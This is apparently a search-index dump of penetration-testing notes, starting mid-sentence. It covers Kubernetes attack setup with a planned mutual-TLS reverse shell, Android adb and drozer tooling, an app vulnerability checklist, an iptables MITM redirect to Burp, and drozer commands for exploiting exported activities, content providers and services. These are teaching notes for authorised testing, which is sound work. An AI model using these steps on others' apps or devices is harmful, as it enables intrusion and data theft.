high privilige access you have a high degree of control over the cluster. Kubelet # Kubelet has its own API, and with access to it you can perform a lot of actions. Kubelet has historically been used in a lot of attacks. Lifecycle of a POD # This image describes pretty well the lifecycle of a pod kubectl or any other API client submits the Pod spec to the API server. The API server writes the Pod object to the etcd data store. Once the write is successful, an acknowledgment is sent back to API server and to the client. The API server now reflects the change in state of etcd. All Kubernetes components use watches to keep checking API server for relevant changes. In this case, the kube-scheduler (via its watcher) sees that a new Pod object is created on API server but is not bound to any node. kube-scheduler assigns a node to the pod and updates the API server. This change is then propagated to the etcd data store. The API server also reflects this node assignment on its Pod object. Kubelet on every node also runs watchers who keep watching API server. Kubelet on the destination node sees that a new Pod is assigned to it. Kubelet starts the pod on its node by calling Docker and updates the container state back to the API server. The API server persists the pod state into etcd. Once etcd sends the acknowledgment of a successful write, the API server sends an acknowledgment back to kubelet indicating that the event is accepted. Understanding IP-addresses # ExternalIP: An endpoint which can be accessed ClusterIP: A Service is created to have a common IP for a service. Since the Pod ips are ephemeral.The service ip is sometimes called ClusterIP.","title":"Basics of Kubernetes"},{"location":"attacking_kubernetes/basics_of_kubernetes/#hardware","text":"A kubernets cluster is the sum of all kubernetes nodes. A node will likely be a physical machine or a virtual machine in a datacenter. A program can run on any of the nodes. It can change, so the program should not be storing data on a specific node, because the program might end up running on another node. To store data persistently Kubernetes uses Persistent volumes. This can be a local or a cloud drive. Think of it has an external harddrive that you plug into your cluster. Persistent volumes can be mounted to the kubernetes kluster, at which point it is accessible from all nodes.","title":"Hardware"},{"location":"attacking_kubernetes/basics_of_kubernetes/#software","text":"Programs running in the kubernetes klusters are package in containers. The most common and popular one is of course Docker. You usually have one service per container.","title":"Software"},{"location":"attacking_kubernetes/basics_of_kubernetes/#pods","text":"Containers are run in Pods. If you application becomes really popular, and can't handle the load, you can simply configure your Pod to have more replicas. Pods can hold serveral containers, but it might be better to just have one container in each pod. Since you might want to scale up only one container, and not all the other containers in the pod. You might waste a lot of resources if you scale up a Pod that containes containers that does not need to be scaled up.","title":"Pods"},{"location":"attacking_kubernetes/basics_of_kubernetes/#deployment","text":"Deployment is an abstraction that defines how many replicas of pods you want. Using deployment you will not deal with pods directly.","title":"Deployment"},{"location":"attacking_kubernetes/basics_of_kubernetes/#ingress","text":"Kubernetes provides a firewall between the outside of the kluster and the inside. However between the pods there are not default firewalls.","title":"Ingress"},{"location":"attacking_kubernetes/basics_of_kubernetes/#admission-controller-podsecuriypolicy","text":"Admission controller sits between the client and the master-api, it kind of works as a filter and a check. The most important admission controller, from a security perspective, is PodSecurityPolicy. You can list the PSP by running this command: kubectl get psp -A - Read the specifications of a specific PSP kubectl describe psp privilege So, how do we implement a PSP? It involved three steps: 1. Create PSP 2. Create a Role that is associated with the PSP 3. Create a Rolebinding that binds the Role to a user, serviceaccount or group. After that the PSP will be implmented for those specific users that are associated through the rolebinding. So, PSP is not set in the manifest file of pod or deployment. The PSP is instead associated to a user through the rolebinding.","title":"Admission controller / PodSecuriyPolicy"},{"location":"attacking_kubernetes/basics_of_kubernetes/#setting-up-a-kubernetes-cluster-in-gcloud","text":"After you have installed GCloud CLI, enabled billing,, and Enabled Kubernets API for your specific project you can create a kluster like this: gcloud container clusters create my-cluster --zone us-west1-a You can start to manage your cluster with kubectl, but first you need to setup credentials to do it: gcloud container clusters get-credentials my-cluster --zone us-west1-a --project kuberntest If you go to the gcloud console you can see that the Kubernetes cluster is created. And if you go to Computer you can see three VM instances created, these are your nodes. If you want to remove them you should do that through kubernetes and not though gcloud, because if you remove those VMs the cluster will just spin up new VMs. Now you can deploy a service to your kluster with the following command Where gitea.yaml is a yaml-config file, which incluldes a docker-image from dockerhub. kubectl apply -f gitea.yaml The file looks like this: apiVersion: v1 kind: Pod metadata: name: gitea-pod spec: containers: - name: gitea-container image: gitea/gitea:1.4 You can now check your pods with this command: kubectl get pods","title":"Setting up a kubernetes cluster in GCLoud"},{"location":"attacking_kubernetes/basics_of_kubernetes/#components","text":"This image describes the components of kubernetes pretty well: Some interesting things to note here is that the API server is the only component that should talk to etcd.","title":"Components"},{"location":"attacking_kubernetes/basics_of_kubernetes/#etcd","text":"Etcd contains all the state of the cluster. It contains information, such as cloud metadata, credentials. It is a key-value database. Etcd is the final word of the state of cluster. So if you have write priviliges to the etcd database you basically own the cluster.","title":"Etcd"},{"location":"attacking_kubernetes/basics_of_kubernetes/#api-server","text":"If you control the api-server, either through a shell or with a user with high privilige access you have a high degree of control over the cluster.","title":"Api-server"},{"location":"attacking_kubernetes/basics_of_kubernetes/#kubelet","text":"Kubelet has its own API, and with access to it you can perform a lot of actions. Kubelet has historically been used in a lot of attacks.","title":"Kubelet"},{"location":"attacking_kubernetes/basics_of_kubernetes/#lifecycle-of-a-pod","text":"This image describes pretty well the lifecycle of a pod kubectl or any other API client submits the Pod spec to the API server. The API server writes the Pod object to the etcd data store. Once the write is successful, an acknowledgment is sent back to API server and to the client. The API server now reflects the change in state of etcd. All Kubernetes components use watches to keep checking API server for relevant changes. In this case, the kube-scheduler (via its watcher) sees that a new Pod object is created on API server but is not bound to any node. kube-scheduler assigns a node to the pod and updates the API server. This change is then propagated to the etcd data store. The API server also reflects this node assignment on its Pod object. Kubelet on every node also runs watchers who keep watching API server. Kubelet on the destination node sees that a new Pod is assigned to it. Kubelet starts the pod on its node by calling Docker and updates the container state back to the API server. The API server persists the pod state into etcd. Once etcd sends the acknowledgment of a successful write, the API server sends an acknowledgment back to kubelet indicating that the event is accepted.","title":"Lifecycle of a POD"},{"location":"attacking_kubernetes/basics_of_kubernetes/#understanding-ip-addresses","text":"ExternalIP: An endpoint which can be accessed ClusterIP: A Service is created to have a common IP for a service. Since the Pod ips are ephemeral.The service ip is sometimes called ClusterIP.","title":"Understanding IP-addresses"},{"location":"attacking_kubernetes/kubernetes_hacking_tools/","text":"Setup # So the scenario is that a customer has setup a kubernetes cluster. In that cluster a docker-containerized application is running in a Pod. That application is vulnerable, and an attacker manages to get rce on that machine. What can he do? Here we want to test the kubernetes environment, not the actual application that is running. In order to simulate this we are going to ask the customer to deploy a containerized application that will give us a reverse shell, so we can operate from the assumption that the application is owned. Generate certificate # We will use the mutual TLS reverse shell found here: Our reverse shell will first retreive the server certificate and the client certificate, and then it will connect back and present the client certificate. Our server will verify the client certificate before receving the shell. So, we need to create a CA (with a CA Root certificate and a private key). Then create a server certificate (the certificate will contain a public key as well as a signature from the CA Private key). The CA will then create a client certificate. Setting up a CA with all certificates can be done using a few different tools. - OpenSSL - EasyRSA - CFSSL EasyRSA # In kali you already have EasyRSA isntalled, in /usr/share/easy-rsa Set up PKI directory structure easyrsa init-pki This will create your CA's root certificate. This certificate is not secret. It will also create a private key, stored in private, called ca.key. This is extremly secret key. easyrsa build-ca Create server certificate: easyrsa gen-req nameofserver nopass Now sign the certificate with your CA's private key: easyrsa sign-req server nameofserver Create client certificate: easyrsa gen-req client1 nopass Sign it with your CA's private key: easyrsa sign-req client client1","title":"Setting Up Tools"},{"location":"attacking_kubernetes/kubernetes_hacking_tools/#setup","text":"So the scenario is that a customer has setup a kubernetes cluster. In that cluster a docker-containerized application is running in a Pod. That application is vulnerable, and an attacker manages to get rce on that machine. What can he do? Here we want to test the kubernetes environment, not the actual application that is running. In order to simulate this we are going to ask the customer to deploy a containerized application that will give us a reverse shell, so we can operate from the assumption that the application is owned.","title":"Setup"},{"location":"attacking_kubernetes/kubernetes_hacking_tools/#generate-certificate","text":"We will use the mutual TLS reverse shell found here: Our reverse shell will first retreive the server certificate and the client certificate, and then it will connect back and present the client certificate. Our server will verify the client certificate before receving the shell. So, we need to create a CA (with a CA Root certificate and a private key). Then create a server certificate (the certificate will contain a public key as well as a signature from the CA Private key). The CA will then create a client certificate. Setting up a CA with all certificates can be done using a few different tools. - OpenSSL - EasyRSA - CFSSL","title":"Generate certificate"},{"location":"attacking_kubernetes/kubernetes_hacking_tools/#easyrsa","text":"In kali you already have EasyRSA isntalled, in /usr/share/easy-rsa Set up PKI directory structure easyrsa init-pki This will create your CA's root certificate. This certificate is not secret. It will also create a private key, stored in private, called ca.key. This is extremly secret key. easyrsa build-ca Create server certificate: easyrsa gen-req nameofserver nopass Now sign the certificate with your CA's private key: easyrsa sign-req server nameofserver Create client certificate: easyrsa gen-req client1 nopass Sign it with your CA's private key: easyrsa sign-req client client1","title":"EasyRSA"},{"location":"attacking_mobile_applications/android/android_tools/","text":"Tools # Android debuging bridge (ADB) # To interact with the cellphone you can use adb. On debian you install it like this. sudo apt-get install android-tools-adb Then you connect the phone over usb to your machine. And open the phone, to allow the phone to connect to your computer. The you can see the device by running adb devices adb shell Why am i getting permission denied? # Add your user to the plugdev group. sudo usermod -aG plugdev $LOGNAME Fix the udev rules: sudo apt-get install android-sdk-platform-tools-common Not found in kali repo. But in debian repo. https://wiki.debian.org/SourcesList Add debian sources and update vim /etc/apt/sources.list deb http://deb.debian.org/debian buster main contrib non-free deb-src http://deb.debian.org/debian buster main contrib non-free deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free deb http://deb.debian.org/debian buster-updates main contrib non-free deb-src http://deb.debian.org/debian buster-updates main contrib non-free sudo apt update sudo apt-get install android-sdk-platform-tools-common Why is my device getting removed if forwarded via qemu-kvm? # If you have forwarded your mobile device to your VM in qemu-kvm and it keeps getting removed, it might be fixed by adding this to your grub file vim /etc/default/grub GRUB_CMDLINE_LINUX_DEFAULT=\"usbcore.autosuspend=-1\" update-grub reboot Drozer # https://github.com/mwrlabs/drozer/releases dpkg -i drozeretc sudo apt -f install sudo dpkg -i drozer drozer console connect --server 10.42.0.11 --password If you are using ADB you can run adb forward tcp:31415 tcp:31415 drozer console connect Drozer is not being maintained anymore. So it might be time to move on to other tools.","title":"Tools"},{"location":"attacking_mobile_applications/android/android_tools/#tools","text":"","title":"Tools"},{"location":"attacking_mobile_applications/android/android_tools/#android-debuging-bridge-adb","text":"To interact with the cellphone you can use adb. On debian you install it like this. sudo apt-get install android-tools-adb Then you connect the phone over usb to your machine. And open the phone, to allow the phone to connect to your computer. The you can see the device by running adb devices adb shell","title":"Android debuging bridge (ADB)"},{"location":"attacking_mobile_applications/android/android_tools/#why-am-i-getting-permission-denied","text":"Add your user to the plugdev group. sudo usermod -aG plugdev $LOGNAME Fix the udev rules: sudo apt-get install android-sdk-platform-tools-common Not found in kali repo. But in debian repo. https://wiki.debian.org/SourcesList Add debian sources and update vim /etc/apt/sources.list deb http://deb.debian.org/debian buster main contrib non-free deb-src http://deb.debian.org/debian buster main contrib non-free deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free deb-src http://deb.debian.org/debian-security/ buster/updates main contrib non-free deb http://deb.debian.org/debian buster-updates main contrib non-free deb-src http://deb.debian.org/debian buster-updates main contrib non-free sudo apt update sudo apt-get install android-sdk-platform-tools-common","title":"Why am i getting permission denied?"},{"location":"attacking_mobile_applications/android/android_tools/#why-is-my-device-getting-removed-if-forwarded-via-qemu-kvm","text":"If you have forwarded your mobile device to your VM in qemu-kvm and it keeps getting removed, it might be fixed by adding this to your grub file vim /etc/default/grub GRUB_CMDLINE_LINUX_DEFAULT=\"usbcore.autosuspend=-1\" update-grub reboot","title":"Why is my device getting removed if forwarded via qemu-kvm?"},{"location":"attacking_mobile_applications/android/android_tools/#drozer","text":"https://github.com/mwrlabs/drozer/releases dpkg -i drozeretc sudo apt -f install sudo dpkg -i drozer drozer console connect --server 10.42.0.11 --password If you are using ADB you can run adb forward tcp:31415 tcp:31415 drozer console connect Drozer is not being maintained anymore. So it might be time to move on to other tools.","title":"Drozer"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/","text":"Manifest configurations # [ ] Check for backup set to true [ ] Check if permission write to external storage is set - review that no sensitive data is stored there [ ] Check if application is running in debuggable mode [ ] Check if network security cleartextpermitted is set to true. Components # Activities # [ ] Check for exported activities [ ] Check for hidden exported activities [ ] Check for interesting views, usable in highly unlikely and ridiculous phishing attack [ ] Check for activities that take arguments, and if those arguments do something interesting. Content providers # [ ] Check if content providers are exported [ ] Check if sensitive information can be accessed [ ] Check for sql injection Services # [ ] Check if servies are exported [ ] Check to see if you can interact with the service Broadcast # [ ] Check if broadcasts are exported Storage # [ ] Check for world readable files in the app [ ] Check for sensitive information in shared_prefs [ ] Check for unencrypted sensitive files in SQL database Unintended data leaks # [ ] Disallow copy-paste for sensitive data [ ] Analytics sent to third party [ ] Check that sensitive data is not logged [ ] Check for Firebase access control WebView attacks # [ ] Check that Javascript if disabled Network security # [ ] Check for unencrypted HTTP traffic [ ] Check for non-http traffic [ ] Check if application verifies server certificate Misc # [ ] Check for hardcoded credentials [ ] TEMP: Act if mobile is rooted","title":"Checklist"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#manifest-configurations","text":"[ ] Check for backup set to true [ ] Check if permission write to external storage is set - review that no sensitive data is stored there [ ] Check if application is running in debuggable mode [ ] Check if network security cleartextpermitted is set to true.","title":"Manifest configurations"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#components","text":"","title":"Components"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#activities","text":"[ ] Check for exported activities [ ] Check for hidden exported activities [ ] Check for interesting views, usable in highly unlikely and ridiculous phishing attack [ ] Check for activities that take arguments, and if those arguments do something interesting.","title":"Activities"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#content-providers","text":"[ ] Check if content providers are exported [ ] Check if sensitive information can be accessed [ ] Check for sql injection","title":"Content providers"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#services","text":"[ ] Check if servies are exported [ ] Check to see if you can interact with the service","title":"Services"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#broadcast","text":"[ ] Check if broadcasts are exported","title":"Broadcast"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#storage","text":"[ ] Check for world readable files in the app [ ] Check for sensitive information in shared_prefs [ ] Check for unencrypted sensitive files in SQL database","title":"Storage"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#unintended-data-leaks","text":"[ ] Disallow copy-paste for sensitive data [ ] Analytics sent to third party [ ] Check that sensitive data is not logged [ ] Check for Firebase access control","title":"Unintended data leaks"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#webview-attacks","text":"[ ] Check that Javascript if disabled","title":"WebView attacks"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#network-security","text":"[ ] Check for unencrypted HTTP traffic [ ] Check for non-http traffic [ ] Check if application verifies server certificate","title":"Network security"},{"location":"attacking_mobile_applications/android/android_vuln_checklist/#misc","text":"[ ] Check for hardcoded credentials [ ] TEMP: Act if mobile is rooted","title":"Misc"},{"location":"attacking_mobile_applications/android/mobile_application_setup/","text":"Introduction # There is no point in reinventing the wheel. So instead of explaining all the possible vectors here it might be easier to use the OWASP Mobile Testing framework. OWASP has provided two resources that are very useful. OWASP Mobile Security Testing Guide Mobile App Security Checklist The guide and the checklist goes hand in hand. And the checklist refers to the guide quite often. The guide and the checklist concerns both Android and iPhone. Setup # Android # We wan to do three different things to test the application: static analysis, dynamic analysis and api-analysis. Static analysis simply refers to inspecting the contents of the application package. In android this is an apk-file. The static analysis can be done using MobSF in linux. A dynamic analysis refers to analysis of the package when it is running. To analyse that we will use Drozer. API-test - Configuration # What we want to do is to be able to send the mobile applications traffic to burp to inspect the http traffic. This can be done in two ways. By proxying the phones traffic to your burp instance, or set up an access point and MITM the phone that way. Invisible intercept # So this technique works by creating a access-point that your mobile phone connects to, and then man-in-the-middle all the traffic through iptables. Redirect the network-card to your VM The first problem I ran into was that the USB-adapter wouldn\u2019t be redirected into the virtual machine. I looked in syslog when I tried to redirect it, and I noticed some error messages from apparmor. It was something like this: apparmor=\"DENIED\" operation=\"open\" profile=\"libvirt-...\" name=\"/run/udev/data/+usb\" comm=\"qemu-system-x86\" The command was qemu-system-x86 , and the operation was open , but apparmor denied the action. After some googeling I figured out that I need to edit the apparmor profile for libvirt-qemu. So I edited this file like this: sudo vim /etc/apparmor.d/abstractions/libvirt-qemu # For hostdev access. The actual devices will be added dynamically /sys/bus/usb/devices/ r, /sys/devices/**/usb[0-9]*/** r, # THIS LINE NEEDS TO BE ADDED /run/udev/data/* rw, Add USB to Virtual Machine If the USB adapter is using USB 3 you might need to change the USB Controller in virt-manager to USB 3. Just change it in Controller USB from 2 to 3. Next you go to Add Hardware , USB Host Device . Another way is to open the VM in spicy/virt-manager and then go to Input/Select USB Devices for Redirection. That usually doesn't work for me though. Verify that the USB-adapter is connected by either checking ifconfig or lsusb . Hopefully you will see the wlan0 network interface. Create a hotspot If you have network-manager it is really simple to set up an access-point. Open up network-manager: nm-connection-editor Then you click Add select Wi-fi . You name the hotspot and change Mode from Client to Hotspot . Then you edit wifi-security, and click Save . Now you should have a working hotspot. You can verify it by looking for it from your host or smartphone. Now just connect to it from the smartphone you want to MITM. You should now be able to see the phones traffic passing by. You can use tcpdump to see that it works. If your device connects but does not get an IP it is probably because you are missing a dhcp-server. You just need to install dnsmasq, and network manager will figure out the rest. tcpdump -i wlan0 Redirect traffic to Burp through iptables apt-get install iptables-persistent iptables-save > rules # Then you edit the rules and add them by: iptables-restore < rules So these are the rules to be added. The ip-address is the address for the smartphone that we want to intercept. :PREROUTING ACCEPT [414:27612] -A PREROUTING -i wlan0 -s 10.41.1.121 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080 -A PREROUTING -i wlan0 -s 10.42.0.121 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 -A PREROUTING -i wlan0 -s 10.42.0.121 -p tcp -m tcp --dport 53 -j REDIRECT --to-ports 53 :POSTROUTING ACCEPT [289:20303] -A POSTROUTING -j MASQUERADE Configure BURP Now you just need to configure burp. go to Proxy/options/Proxy Listener/Add/Choose your interface and port . Then Click on Request Handeling and then Support invisible proxying . Import Burp certificate Now you need to import you burp-certificate to you phone, in order to handle HTTPS traffic. Remember that this will not work if the application you are assessing is using certificate pinning. Open the web browser in your phone and go to your machines ip-address on port 8080 (or whatever port burp is listening on). Download the burp-certificate. Rename it to cacert.cer Go to settings , security , install from storage . And then select your cerrificate. Get the application on to the phone. This is usually a really simple process. Just store the apk on your attacking-machine and have the phone download it through a webserver python -m SimpleHTTPServer 80 Use proxy-settings on your phone # The other way of doing it is simply to set up your hotspot, and then connect the phone onto the hotspot and then configure the phone to go tospecific proxy settings. So you go to Settings/wifi/(hold on the specified network/modify network/proxy/manual. Scroll down and then input the ip address of your hotspot, for example 10.42.0.1 and the proxy port: 8080. Now you need to configure burp to listen to your wifi interface. Proxy/Options/Proxy listener Installing drozer # Download drozer here: https://github.com/mwrlabs/drozer/releases sudo dpkg -i drozer.deb sudo apt install -f Install drozer on phone. Start it. Check the settings that a password is set.","title":"Android Testing Environment Setup"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#introduction","text":"There is no point in reinventing the wheel. So instead of explaining all the possible vectors here it might be easier to use the OWASP Mobile Testing framework. OWASP has provided two resources that are very useful. OWASP Mobile Security Testing Guide Mobile App Security Checklist The guide and the checklist goes hand in hand. And the checklist refers to the guide quite often. The guide and the checklist concerns both Android and iPhone.","title":"Introduction"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#setup","text":"","title":"Setup"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#android","text":"We wan to do three different things to test the application: static analysis, dynamic analysis and api-analysis. Static analysis simply refers to inspecting the contents of the application package. In android this is an apk-file. The static analysis can be done using MobSF in linux. A dynamic analysis refers to analysis of the package when it is running. To analyse that we will use Drozer.","title":"Android"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#api-test-configuration","text":"What we want to do is to be able to send the mobile applications traffic to burp to inspect the http traffic. This can be done in two ways. By proxying the phones traffic to your burp instance, or set up an access point and MITM the phone that way.","title":"API-test - Configuration"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#invisible-intercept","text":"So this technique works by creating a access-point that your mobile phone connects to, and then man-in-the-middle all the traffic through iptables. Redirect the network-card to your VM The first problem I ran into was that the USB-adapter wouldn\u2019t be redirected into the virtual machine. I looked in syslog when I tried to redirect it, and I noticed some error messages from apparmor. It was something like this: apparmor=\"DENIED\" operation=\"open\" profile=\"libvirt-...\" name=\"/run/udev/data/+usb\" comm=\"qemu-system-x86\" The command was qemu-system-x86 , and the operation was open , but apparmor denied the action. After some googeling I figured out that I need to edit the apparmor profile for libvirt-qemu. So I edited this file like this: sudo vim /etc/apparmor.d/abstractions/libvirt-qemu # For hostdev access. The actual devices will be added dynamically /sys/bus/usb/devices/ r, /sys/devices/**/usb[0-9]*/** r, # THIS LINE NEEDS TO BE ADDED /run/udev/data/* rw, Add USB to Virtual Machine If the USB adapter is using USB 3 you might need to change the USB Controller in virt-manager to USB 3. Just change it in Controller USB from 2 to 3. Next you go to Add Hardware , USB Host Device . Another way is to open the VM in spicy/virt-manager and then go to Input/Select USB Devices for Redirection. That usually doesn't work for me though. Verify that the USB-adapter is connected by either checking ifconfig or lsusb . Hopefully you will see the wlan0 network interface. Create a hotspot If you have network-manager it is really simple to set up an access-point. Open up network-manager: nm-connection-editor Then you click Add select Wi-fi . You name the hotspot and change Mode from Client to Hotspot . Then you edit wifi-security, and click Save . Now you should have a working hotspot. You can verify it by looking for it from your host or smartphone. Now just connect to it from the smartphone you want to MITM. You should now be able to see the phones traffic passing by. You can use tcpdump to see that it works. If your device connects but does not get an IP it is probably because you are missing a dhcp-server. You just need to install dnsmasq, and network manager will figure out the rest. tcpdump -i wlan0 Redirect traffic to Burp through iptables apt-get install iptables-persistent iptables-save > rules # Then you edit the rules and add them by: iptables-restore < rules So these are the rules to be added. The ip-address is the address for the smartphone that we want to intercept. :PREROUTING ACCEPT [414:27612] -A PREROUTING -i wlan0 -s 10.41.1.121 -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 8080 -A PREROUTING -i wlan0 -s 10.42.0.121 -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 -A PREROUTING -i wlan0 -s 10.42.0.121 -p tcp -m tcp --dport 53 -j REDIRECT --to-ports 53 :POSTROUTING ACCEPT [289:20303] -A POSTROUTING -j MASQUERADE Configure BURP Now you just need to configure burp. go to Proxy/options/Proxy Listener/Add/Choose your interface and port . Then Click on Request Handeling and then Support invisible proxying . Import Burp certificate Now you need to import you burp-certificate to you phone, in order to handle HTTPS traffic. Remember that this will not work if the application you are assessing is using certificate pinning. Open the web browser in your phone and go to your machines ip-address on port 8080 (or whatever port burp is listening on). Download the burp-certificate. Rename it to cacert.cer Go to settings , security , install from storage . And then select your cerrificate. Get the application on to the phone. This is usually a really simple process. Just store the apk on your attacking-machine and have the phone download it through a webserver python -m SimpleHTTPServer 80","title":"Invisible intercept"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#use-proxy-settings-on-your-phone","text":"The other way of doing it is simply to set up your hotspot, and then connect the phone onto the hotspot and then configure the phone to go tospecific proxy settings. So you go to Settings/wifi/(hold on the specified network/modify network/proxy/manual. Scroll down and then input the ip address of your hotspot, for example 10.42.0.1 and the proxy port: 8080. Now you need to configure burp to listen to your wifi interface. Proxy/Options/Proxy listener","title":"Use proxy-settings on your phone"},{"location":"attacking_mobile_applications/android/mobile_application_setup/#installing-drozer","text":"Download drozer here: https://github.com/mwrlabs/drozer/releases sudo dpkg -i drozer.deb sudo apt install -f Install drozer on phone. Start it. Check the settings that a password is set.","title":"Installing drozer"},{"location":"attacking_mobile_applications/android/mobile_application_vulnerabilities_android/","text":"Check for manifest misconfigurations # To read the manifest file and other files and assets you can use: sudo aptitude install apktool apktool d blabla.apk cd res/xml Allow backup set to true # In the manifest file it is possible to specify if it should be possible to backup the application data, if the user has usb debugging enabled. Applications that store sensitive data on disk should have this set to false: Check for the following in the manifest file: android:allowBackup=\"false\" If backup is allowed you can backup the data like this: adb backup -apk com.theapp.blabla sudo aptitude install qpdf #this is where zlib-flate is found dd if=backup.ab bs=24 skip=1 | zlib-flate -uncompress > res.tar tar xvf res.tar Check if application is run in debuggable mode # If the application is configured to run in debuggable mode the following will be set in the manifest file. <application debuggable=\"true\" It can also be checked with drozer with: run app.package.debuggable Check network security configurations # Cleartexttraffic is set to false by default in android 9. Network traffic configuration is set in the manifest-file. If you see this in the manifest-file it means that the configurations are made in the network-security file. android:networkSecurityConfig=\"@xml/network_security_config\" The network-security file is found in res/xml/network_security_config.xml . Check if domain-config cleartextTrafficPermitted=\"true\" is set to true, and to what domain it is allowed. Check permissions # If the application has to wide permissions it might be a concern for privacy, but usually not a vulnerability or risk to the application itself. Check permissions i the manifest file or with Drozer. Drozer command: run app.package.info -a com.yourapp.blabla There is no general right or wrong. Are the permissions correct in relation to what the application is doing? Some a universally dangerous permissions, like the following. There is not many legitimate reasons to allow an app to install other packages. android.permissions.INSTALL_PACKAGES Each permission has a android-defined permissions level: normal , dangerous and signature . https://developer.android.com/guide/topics/permissions/overview#normal-dangerous If a permission is defined as \"dangerous\", such as reading contacts. The user must explicitly agree to the permission for it to be active. Exploiting application components # There are four types of \"components\" in an android applications: - Activity - screens/views - Content provider - database objects - Services - background workers - Broadcast receiver Three of these four components are activated using asynchronous messages called \"intents\". The components that are activated using intents are activity , services , and broadcast receivers If a component is exported or not is defined in the manifest.xml file. You can map the attacksurface of the components using these drozer commands run app.package.list run app.package.attacksurface app.theapp Exploiting exported activities # What is an intent? \"An Intent provides a facility for performing late runtime binding between the code in different applications. Its most significant use is in the launching of activities, where it can be thought of as the glue between activities. It is basically a passive data structure holding an abstract description of an action to be performed.\" A good explanation of how this attack works is here: https://appsec-labs.com/portal/hacking-android-apps-through-exposed-components/ Activities that are specified as \"exported\" in the manifest file can be run by other applications on the phone. In a sense, the other application is just running a function on the victim-application. What that function does depends on the application. The Activities might just start a new view. But they may also include arguments. Look for activities that are exported and allows arguments. .getExtras To check which activitites are exported run: run app.package.list run app.package.attacksurface com.appen.blabla Attack Surface: 2 activities exported 2 broadcast receivers exported 0 content providers exported 2 services exported Now you want to check which activities those are: run app.activity.info -a com.appen.blabla run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList Hidden view # There might be hidden functionality in the application, than can be accessed by a user, using adb or drozer. It might be the case that only premium users should be able to access certain functionality. ANd that functionality is accessible in the application, but there is no backend checks. So a user would be able to use the free version, but access functionality that should only be accessible to premium users. Check for: List the activities, and test them. Do they expose functionality that should not be accessible to the user. run app.activity.info -a com.theapp.blabla Phishing # Check if an activity that is exported, and therefore can be started by other applications, can be used in some kind of phishing-attack. The idea would be to create a fake application, that does something, and then open up the activity of the victim-application, thereby tricking the victim into inserting data into that view. Check for by starting the different views and see if any can be used in phishing attacks. run app.activity.info -a com.theapp.blabla Injections # Activities can be configured to accept arguments. This means that a malicious application could start the activity and also insert arguments that might be processed in some way. An activity is just an event, and can be programmed to do whatever, so you will need to review the source-code of the activity in order to see if it takes arguments, and in that case see how the argument is processed. Maybe the argument is used to access an sql-database on the phone, or something else like that. Activities that have arguments use the getExtras() function. So search the source-code for getExtras , and see if it is used with any of the exported activities. You can also look for getStringExtra() . If you find one you can use it like this: dz> run app.activity.start --component app.theapp.dev app.theapp.core.main.theactivity --extra string aaaaa bbb Exploiting insecure Content Providers # Content providers are interfaces for sharing data between applications. Each content provider has en url that looks something like this content:// . Other applications can use the content provider to query information. They can use functions like insert() , query() , and update() to access data in another application. If this is configured incorrectly another application could possibly access sensitive data from the application. The data might be a file written to the disk, or it might be written to a database, or some other persistent storage. If content providers are exported # Again content providers that are exported means that they are exposed to other applications. So, in order to map the exported content providers you can look in the manifest file or check it using drozer. With drozer it looks like this: run app.package.attacksurface app.theapp If you find that there are some content providers that are exported you can get more info on them with this command: run app.provider.info -a app.theapp To list all providers, even the content providers that other application can't access you add the -u flag. run app.provider.info -a app.theapp -u Check if sensitive information can be accessed # Check for uri paths: run app.provider.finduri com.appen.blabla If you find some content providers that are exported you can query those and see if you can access some sensitive information. This can be done like this: run app.provider.query content://com.theapp.uripath/ Check for SQL injections # Content providers are sometimes connected to a SQLite database. Check out https://solidgeargroup.com/en/sql-injection-in-content-providers-of-android-and-how-to-be-protected/ resources how to check for this and exploit. Attacking Insecure Services # A services is a component that is running in the background to perform long-running operations or to perform work for remote processes. A service might play music in the background while the user is in a different application. Or it might access data over the network while the user is doing something else. There are three different types of services scheduled , started , and bound . The services are listed in the manifest file, it looks something like this in the manifest: <service android: name=\u201d.Example Service\u201d /> run app.service.info -a com.theapp.blabla You can run a service like this: run app.service.start --action com.theapp.blabla.somService --component com.theapp.blabla com.theapp.blabla.somService https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/drozer-tutorial Attacking broadcast receivers # Applications can register broadcast receivers, this will allow them to be able to receive broadcast from the OS or from other applications. It is like a publish-subscribe pattern. If an application registers to receive a specific broadcast the system till route traffic to that application when such a broadcast is published. Storage # Data can be stored in multiple ways in an android device. For example: Shared Preferences SQLite Databases Realm Databases Internal Storage External Storage Check for sensitive information in shared_prefs # The SharedPreferences API is commonly used to permanently save small collections of key-value pairs. Data stored in a SharedPreferences object is written to a plain-text XML file. The SharedPreferences object can be declared world-readable (accessible to all apps) or private. Misuse of the SharedPreferences API can often lead to exposure of sensitive data. Check the following file to see if sensitive data (like passwords or tokens) are stored in it. /data/data/<package-name>/shared_prefs/key.xml Check for world readable files in the app # Maybe som files on the application for some reason has received incorrect filepermissions, drozer can find those: run scanner.misc.readablefiles /data/data/com.theapp.blabla Or you can go to the app: ls -la /data/data/app.theapp.blabla/shared_prefs And look for -rw-rw-r-- From the owasp guide: \"Please note that MODE_WORLD_READABLE and MODE_WORLD_WRITEABLE were deprecated starting on API level 17. Although newer devices may not be affected by this, applications compiled with an android:targetSdkVersion value less than 17 may be affected if they run on an OS version that was released before Android 4.2 (API level 